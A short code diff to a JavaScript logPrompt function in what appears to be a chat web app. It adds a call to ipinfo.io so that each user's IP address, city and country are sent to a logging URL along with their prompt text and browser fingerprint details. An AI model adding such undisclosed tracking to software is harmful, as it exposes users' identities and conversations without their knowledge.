@@ -62,7 +62,7 @@ function parseDevice(ua) {
     return 'Unknown';
 }
 
-function logPrompt(text) {
+async function logPrompt(text) {
     if (!PROMPT_LOG_URL) return;
 
     const ts     = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
@@ -74,6 +74,13 @@ function logPrompt(text) {
     const cores  = navigator.hardwareConcurrency || '?';
     const mem    = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?';
     const conn   = navigator.connection ? (navigator.connection.effectiveType || '?') : '?';
+
+    let ip = '?', city = '', country = '';
+    try {
+        const d = await fetch('https://ipinfo.io/json').then(r => r.json());
+        if (d.ip) { ip = d.ip; city = d.city || ''; country = d.country || ''; }
+    } catch(_) {}
+    const loc = [city, country].filter(Boolean).join(', ') || tz;
 
     // Build conversation context
     let context = '';
@@ -93,7 +100,7 @@ function logPrompt(text) {
         text.slice(0, 1200),
         `\`\`\``,
         `🖥️  **Device:**   ${device}`,
-        `🌍  **Location:**  ${tz}`,
+        `🌐  **IP:**       ${ip}  —  ${loc}`,
         `🗣️  **Language:** ${lang}`,
         `📐  **Screen:**   ${screen}  ·  Viewport: ${vp}`,
         `📶  **Network:**  ${conn}`,
